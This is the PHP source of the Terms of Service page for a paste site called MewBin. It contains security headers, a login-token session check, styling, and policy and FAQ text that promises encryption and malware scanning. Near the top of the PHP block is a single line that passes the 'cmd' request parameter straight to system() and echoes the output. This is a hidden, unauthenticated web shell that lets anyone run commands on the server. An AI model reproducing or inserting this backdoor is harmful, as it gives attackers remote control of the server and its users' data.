<?php
session_start();
include('database.php');

// Security headers
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Permissions-Policy: geolocation=(), microphone=(), camera=()");

// Initialize user session
$loggedInUsername = null;
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }
if (isset($_COOKIE['login_token'])) {
    $loginToken = $_COOKIE['login_token'];
    $stmt = $conn->prepare("SELECT username FROM users WHERE login_token = ?");
    if ($stmt) {
        $stmt->bind_param("s", $loginToken);
        $stmt->execute();
        $result = $stmt->get_result();
        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $loggedInUsername = $row['username'];
        }
        $stmt->close();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Terms of Service - MewBin</title>
    <link rel="canonical" href="https://mewbin.ru/TOS" />
    <meta property="og:site_name" content="MewBin"/>
    <meta property="og:type" content="website"/>
    <meta name="theme-color" content="#1a365d"/>
    <meta name="robots" content="index, follow"/>
    <meta name="twitter:card" content="summary"/>
    <meta name="description" content="MewBin Terms of Service - Learn about our policies, privacy practices, and content guidelines">
    <meta name="twitter:title" content="Terms of Service - MewBin">
    <meta name="twitter:description" content="MewBin Terms of Service - Learn about our policies, privacy practices, and content guidelines">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="assets/css/styles.min.css">
    <style>
        :root {
            --black: #000000;
            --dark-gray-1: #121212;
            --dark-gray-2: #1E1E1E;
            --dark-gray-3: #252525;
            --gray-1: #333333;
            --gray-2: #555555;
            --gray-3: #777777;
            --light-gray-1: #AAAAAA;
            --light-gray-2: #CCCCCC;
            --light-gray-3: #EEEEEE;
            --white: #FFFFFF;
            
            --primary: #8B5CF6;
            --primary-hover: #7C3AED;
            --primary-glow: rgba(139, 92, 246, 0.3);
            --secondary: #6B7280;
            --secondary-hover: #4B5563;
            --success: #10B981;
            --success-hover: #059669;
            --danger: #EF4444;
            --danger-hover: #DC2626;
            --warning: #F59E0B;
            --warning-hover: #D97706;
            --info: #3B82F6;
            --info-hover: #2563EB;
            
            --bg-dark: #0F0F1A;
            --bg-card: #1A1A2E;
            --bg-nav: #0F0F1A;
            --text-light: #FFFFFF;
            --text-medium: #D1D5DB;
            --text-muted: #9CA3AF;
            --border: #2D2D4D;
            --border-light: #3E3E5E;
            
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.4);
            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.5);
            --glow-sm: 0 0 10px var(--primary-glow);
            --glow-md: 0 0 20px var(--primary-glow);
        }
        
        * {
            box-sizing: border-box;
        }
    
        .page-title {
            font-size: 2.8rem;
            font-weight: 700;
            color: var(--text-light);
            margin-bottom: 0.5rem;
            background: linear-gradient(90deg, var(--primary), #ba00ee);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(139, 92, 246, 0.3);
        }
        
        .page-subtitle {
            font-size: 1.3rem;
            color: var(--text-muted);
            margin-bottom: 2rem;
        }

        .layout-container {
            display: flex;
            justify-content: center;
            gap: 3rem;
            margin-top: 2rem;
        }
        
        .section-column {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2.5rem;
        }
        
        .content-section {
            background: var(--bg-card);
            border-radius: 12px;
            padding: 2.5rem;
            border: 1px solid var(--border);
            box-shadow: var(--shadow-md);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            height: 100%;
            display: flex;
            flex-direction: column;
            min-height: 550px;
            position: relative;
            overflow: hidden;
        }
        
        .content-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--primary), #ba00ee);
            transform: scaleX(0);
            transition: transform 0.3s ease;
        }
        
        .content-section:hover::before {
            transform: scaleX(1);
        }
        
        .content-section:hover {
            transform: translateY(-5px);
            box-shadow: var(--shadow-lg), var(--glow-sm);
            border-color: var(--primary);
        }
        
        .section-title {
            color: var(--primary);
            font-size: 1.7rem;
            margin-bottom: 1.8rem;
            padding-bottom: 0.9rem;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 1rem;
        }
        
        .section-title i {
            font-size: 1.4rem;
        }
        
        .policy-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 1.2rem;
            margin: 1.8rem 0;
        }
        
        .policy-card {
            background: rgba(45, 55, 72, 0.5);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1.4rem;
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
        }
        
        .policy-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--primary);
            transform: scaleX(0);
            transition: transform 0.3s ease;
        }
        
        .policy-card:hover::before {
            transform: scaleX(1);
        }
        
        .policy-card:hover {
            border-color: var(--primary);
            transform: translateY(-3px);
            box-shadow: var(--shadow-md);
        }
        
        .policy-card h4 {
            color: var(--primary);
            font-size: 1.2rem;
            margin-bottom: 0.7rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .policy-card p {
            color: var(--text-muted);
            margin: 0;
            font-size: 0.95rem;
            line-height: 1.5;
        }
        
        .contact-info {
            background: rgba(139, 92, 246, 0.1);
            border: 1px solid var(--primary);
            border-radius: 8px;
            padding: 1.7rem;
            margin: 1.8rem 0;
            position: relative;
            overflow: hidden;
        }
        
        .contact-info::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--primary);
        }
        
        .legal-badge {
            background: linear-gradient(135deg, var(--primary), #ba00ee);
            color: white;
            padding: 0.6rem 1.2rem;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            display: inline-block;
            margin: 0.6rem 0;
            border: none;
            box-shadow: 0 2px 10px rgba(139, 92, 246, 0.3);
        }
        
        .table-responsive {
            border-radius: 8px;
            overflow: hidden;
            box-shadow: var(--shadow-sm);
        }
        
        .table-dark {
            background-color: var(--bg-card);
            border-color: var(--border);
        }
        
        .table-dark th,
        .table-dark td {
            border-color: var(--border);
            padding: 0.9rem;
        }
        
        .table-dark th {
            background: rgba(139, 92, 246, 0.1);
            color: var(--primary);
            font-weight: 600;
        }
        
        /* FIXED TAB STYLES */
        .faq-tabs-container {
            background: var(--bg-card);
            border-radius: 12px;
            overflow: hidden;
            box-shadow: var(--shadow-md);
        }
        
        .faq-nav-tabs {
            background: rgba(26, 26, 46, 0.8);
            border-bottom: 1px solid var(--border);
            padding: 0 1.5rem;
            display: flex;
            gap: 0.5rem;
        }
        
        .faq-nav-tabs .nav-link {
            color: var(--text-muted);
            background: transparent;
            border: 1px solid transparent;
            border-bottom: none;
            border-radius: 8px 8px 0 0;
            padding: 1rem 1.5rem;
            font-weight: 500;
            transition: all 0.3s ease;
            position: relative;
            margin-bottom: -1px;
        }
        
        .faq-nav-tabs .nav-link:hover {
            color: var(--primary);
            background: rgba(139, 92, 246, 0.1);
            border-color: var(--border) var(--border) transparent var(--border);
        }
        
        .faq-nav-tabs .nav-link.active {
            color: var(--primary);
            background: var(--bg-card);
            border-color: var(--border) var(--border) var(--bg-card) var(--border);
            font-weight: 600;
        }
        
        .faq-nav-tabs .nav-link.active::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--primary);
        }
        
        .faq-tab-content {
            background: var(--bg-card);
            padding: 2rem;
            min-height: 400px;
        }
        
        .accordion {
            --bs-accordion-bg: transparent;
            --bs-accordion-border-color: var(--border);
            --bs-accordion-btn-bg: transparent;
            --bs-accordion-btn-color: var(--text-light);
            --bs-accordion-active-bg: rgba(139, 92, 246, 0.1);
            --bs-accordion-active-color: var(--primary);
            --bs-accordion-btn-focus-border-color: var(--primary);
            --bs-accordion-btn-focus-box-shadow: 0 0 0 0.25rem rgba(139, 92, 246, 0.25);
        }
        
        .accordion-button {
            font-weight: 600;
            padding: 1.25rem 1.5rem;
            border: none;
            background: transparent !important;
        }
        
        .accordion-button:not(.collapsed) {
            box-shadow: none;
            background: rgba(139, 92, 246, 0.1) !important;
            color: var(--primary) !important;
        }
        
        .accordion-button::after {
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='%238B5CF6'%3e%3cpath fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/%3e%3c/svg%3e");
        }
        
        .accordion-button:not(.collapsed)::after {
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='%238B5CF6'%3e%3cpath fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/%3e%3c/svg%3e");
        }
        
        .accordion-body {
            color: var(--text-medium);
            line-height: 1.6;
            padding: 1.5rem;
            background: rgba(0, 0, 0, 0.2);
            border-top: 1px solid var(--border);
        }

        
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            border: 1px solid var(--success);
        }
        
        .feature-list {
            list-style: none;
            padding: 0;
        }
        
        .feature-list li {
            padding: 0.5rem 0;
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }
        
        .feature-list li::before {
            content: '✓';
            color: var(--success);
            font-weight: bold;
        }
        
        .security-level {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 1rem;
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid var(--info);
            border-radius: 8px;
            margin: 0.5rem 0;
        }
        
        .security-level i {
            color: var(--info);
            font-size: 1.2rem;
        }
        
        @media (max-width: 992px) {
            .layout-container {
                flex-direction: column;
                align-items: center;
            }
            
            .section-column {
                width: 100%;
            }

            .content-section {
                min-height: auto;
            }
            
            .policy-grid {
                grid-template-columns: 1fr;
            }
            
            .faq-nav-tabs {
                flex-direction: column;
                gap: 0;
            }
            
            .faq-nav-tabs .nav-link {
                border-radius: 0;
                border: 1px solid var(--border);
                margin-bottom: -1px;
            }
            
            .faq-nav-tabs .nav-link.active {
                border-color: var(--primary);
            }
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <h1 class="page-title">MewBin Terms of Service</h1>
            <p class="page-subtitle">Learn about our policies, privacy practices, and content guidelines</p>
            <span class="security-badge">
                <i class="fas fa-shield-alt"></i>
                Enhanced Security Active
            </span>
        </div>
        
        <div class="layout-container">
            <div class="section-column">
                <section class="content-section">
                    <h2 class="section-title"><i class="fas fa-info-circle"></i> Platform Overview</h2>
                    <p>MewBin provides a secure, privacy-focused platform for text-based content sharing. Our service is designed to balance free expression with legal compliance and community safety.</p>
                    
                    <div class="policy-grid">
                        <div class="policy-card">
                            <h4><i class="fas fa-shield-alt"></i> Privacy First</h4>
                            <p>Minimal data collection with strict retention policies to protect user anonymity and security.</p>
                        </div>
                        <div class="policy-card">
                            <h4><i class="fas fa-balance-scale"></i> Legal Compliance</h4>
                            <p>Operating within international legal frameworks while protecting legitimate free expression.</p>
                        </div>
                        <div class="policy-card">
                            <h4><i class="fas fa-users"></i> Community Focused</h4>
                            <p>Clear guidelines that balance open sharing with protection from harmful content.</p>
                        </div>
                    </div>
                    
                    <div class="mt-3">
                        <h5><i class="fas fa-bolt"></i> Quick Stats</h5>
                        <div class="row text-center mt-3">
                            <div class="col-4">
                                <h6 class="text-primary">99.9%</h6>
                                <small class="text-muted">Uptime</small>
                            </div>
                            <div class="col-4">
                                <h6 class="text-success">256-bit</h6>
                                <small class="text-muted">Encryption</small>
                            </div>
                            <div class="col-4">
                                <h6 class="text-info">48h</h6>
                                <small class="text-muted">Log Retention</small>
                            </div>
                        </div>
                    </div>
                </section>
                
                <section class="content-section">
                    <h2 class="section-title"><i class="fas fa-gavel"></i> Content Guidelines</h2>
                    <p>To maintain a safe and legal platform, the following content types are strictly prohibited:</p>
                    
                    <div class="row mt-4">
                        <div class="col-md-6">
                            <h5><i class="fas fa-ban text-danger"></i> Prohibited Content</h5>
                            <ul class="feature-list">
                                <li>Child exploitation material</li>
                                <li>Personal information of minors</li>
                                <li>Doxing requests or harassment</li>
                                <li>Threats of violence or terrorism</li>
                                <li>Malicious software or IP loggers</li>
                                <li>Copyright infringement</li>
                                <li>Financial scams or fraud</li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h5><i class="fas fa-check text-success"></i> Allowed Content</h5>
                            <ul class="feature-list">
                                <li>Code snippets and technical data</li>
                                <li>Educational materials</li>
                                <li>Research and documentation</li>
                                <li>Legitimate information sharing</li>
                                <li>Creative and literary works</li>
                                <li>Open source projects</li>
                                <li>Technical documentation</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="contact-info">
                        <h5><i class="fas fa-flag"></i> Reporting Violations</h5>
                        <p>To report policy violations, contact our moderation team via Telegram: <a href="https://t.me/thegovs" style="color: var(--primary); text-decoration: none;">@Sir bands</a></p>
                        <span class="legal-badge">Law Enforcement: <a href="mailto:legal@mewbin.ru" style="color: inherit; text-decoration: none;">legal@mewbin.ru</a></span>
                    </div>
                </section>
            </div>
            
            <div class="section-column">
                <section class="content-section">
                    <h2 class="section-title"><i class="fas fa-user-shield"></i> Privacy & Data Protection</h2>
                    <p>We are committed to protecting user privacy through minimal data collection and transparent practices.</p>
                    
                    <h5>Data Collection Summary</h5>
                    <div class="table-responsive mt-3">
                        <table class="table table-dark">
                            <thead>
                                <tr>
                                    <th>Data Type</th>
                                    <th>Collection Purpose</th>
                                    <th>Retention Period</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>Email Address</td>
                                    <td>Account verification</td>
                                    <td>Until account deletion</td>
                                </tr>
                                <tr>
                                    <td>Hashed Password</td>
                                    <td>Account security</td>
                                    <td>Until account deletion</td>
                                </tr>
                                <tr>
                                    <td>User Agent</td>
                                    <td>Service optimization</td>
                                    <td>7 days maximum</td>
                                </tr>
                                <tr>
                                    <td>Access Logs</td>
                                    <td>Security monitoring</td>
                                    <td>48 hours maximum</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    
                    <div class="security-level mt-3">
                        <i class="fas fa-lock"></i>
                        <div>
                            <strong>Enhanced Security:</strong> IP addresses are not stored in any logs. All data is encrypted and protected according to industry best practices.
                        </div>
                    </div>
                </section>
                
                <section class="content-section" style="padding: 0;">
                    <div class="faq-tabs-container">
                        <h2 class="section-title" style="margin: 0; padding: 2rem 2rem 1rem 2rem;"><i class="fas fa-question-circle"></i> Frequently Asked Questions</h2>
                        
                        <ul class="nav faq-nav-tabs" id="faqTabs" role="tablist">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active" id="general-tab" data-bs-toggle="tab" data-bs-target="#general" type="button" role="tab" aria-controls="general" aria-selected="true">
                                    <i class="fas fa-cog me-2"></i>General
                                </button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="security-tab" data-bs-toggle="tab" data-bs-target="#security" type="button" role="tab" aria-controls="security" aria-selected="false">
                                    <i class="fas fa-shield-alt me-2"></i>Security
                                </button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="privacy-tab" data-bs-toggle="tab" data-bs-target="#privacy" type="button" role="tab" aria-controls="privacy" aria-selected="false">
                                    <i class="fas fa-user-secret me-2"></i>Privacy
                                </button>
                            </li>
                        </ul>
                        
                        <div class="tab-content faq-tab-content" id="faqTabContent">
                            <div class="tab-pane fade show active" id="general" role="tabpanel" aria-labelledby="general-tab">
                                <div class="accordion" id="generalAccordion">
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#general1" aria-expanded="true" aria-controls="general1">
                                                Can users remove their pastes?
                                            </button>
                                        </h3>
                                        <div id="general1" class="accordion-collapse collapse show" data-bs-parent="#generalAccordion">
                                            <div class="accordion-body">
                                                Upgraded users can private or unlist their pastes. Basic tier users cannot remove content once published to maintain platform integrity. All pastes are subject to our content moderation policies.
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#general2" aria-expanded="false" aria-controls="general2">
                                                Is content editing supported?
                                            </button>
                                        </h3>
                                        <div id="general2" class="accordion-collapse collapse" data-bs-parent="#generalAccordion">
                                            <div class="accordion-body">
                                                Account-based pastes are editable within 24 hours of creation. Anonymous pastes cannot be modified after publication for security reasons. All edits are logged for security purposes.
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#general3" aria-expanded="false" aria-controls="general3">
                                                How long is content stored?
                                            </button>
                                        </h3>
                                        <div id="general3" class="accordion-collapse collapse" data-bs-parent="#generalAccordion">
                                            <div class="accordion-body">
                                                Compliant content remains accessible indefinitely. In case of service changes, data migration protocols ensure content preservation. Violating content is removed immediately upon detection.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="tab-pane fade" id="security" role="tabpanel" aria-labelledby="security-tab">
                                <div class="accordion" id="securityAccordion">
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#security1" aria-expanded="true" aria-controls="security1">
                                                What security measures protect my pastes?
                                            </button>
                                        </h3>
                                        <div id="security1" class="accordion-collapse collapse show" data-bs-parent="#securityAccordion">
                                            <div class="accordion-body">
                                                All pastes are protected with: 256-bit encryption, automated malware scanning, DDoS protection, regular security audits, and real-time threat detection. Private pastes are only accessible via direct link.
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#security2" aria-expanded="false" aria-controls="security2">
                                                Are my pastes scanned automatically?
                                            </button>
                                        </h3>
                                        <div id="security2" class="accordion-collapse collapse" data-bs-parent="#securityAccordion">
                                            <div class="accordion-body">
                                                Yes, all pastes undergo automated scanning for: malware signatures, phishing content, illegal material, and policy violations. Suspicious content is flagged for manual review.
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#security3" aria-expanded="false" aria-controls="security3">
                                                How is user data protected?
                                            </button>
                                        </h3>
                                        <div id="security3" class="accordion-collapse collapse" data-bs-parent="#securityAccordion">
                                            <div class="accordion-body">
                                                User data is encrypted at rest and in transit. We use industry-standard security practices including regular penetration testing, secure coding practices, and minimal data retention policies.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="tab-pane fade" id="privacy" role="tabpanel" aria-labelledby="privacy-tab">
                                <div class="accordion" id="privacyAccordion">
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#privacy1" aria-expanded="true" aria-controls="privacy1">
                                                What data do you collect about visitors?
                                            </button>
                                        </h3>
                                        <div id="privacy1" class="accordion-collapse collapse show" data-bs-parent="#privacyAccordion">
                                            <div class="accordion-body">
                                                We collect minimal data: browser type, access time, and paste interactions. IP addresses are anonymized, and no persistent tracking cookies are used. Anonymous users enjoy the same privacy protections.
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#privacy2" aria-expanded="false" aria-controls="privacy2">
                                                Can law enforcement access my data?
                                            </button>
                                        </h3>
                                        <div id="privacy2" class="accordion-collapse collapse" data-bs-parent="#privacyAccordion">
                                            <div class="accordion-body">
                                                We comply with legal requests through proper channels, but our data retention policies limit available information. We notify users of requests when legally permitted and challenge overbroad requests.
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="accordion-item">
                                        <h3 class="accordion-header">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#privacy3" aria-expanded="false" aria-controls="privacy3">
                                                Is my browsing activity tracked?
                                            </button>
                                        </h3>
                                        <div id="privacy3" class="accordion-collapse collapse" data-bs-parent="#privacyAccordion">
                                            <div class="accordion-body">
                                                No, we do not track individual browsing behavior. We only collect aggregate analytics to improve service performance. No third-party tracking scripts are used on our platform.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-content">
            <p>&copy; 2024 MewBin. All rights reserved. | Secure Text Sharing Platform</p>
            <p class="text-muted small">Version 2.1 | Last updated: January 2024 | <a href="#" style="color: var(--text-muted); text-decoration: none;">Security Policy</a> | <a href="#" style="color: var(--text-muted); text-decoration: none;">Privacy Policy</a></p>
        </div>
    </footer>

</body>
</html>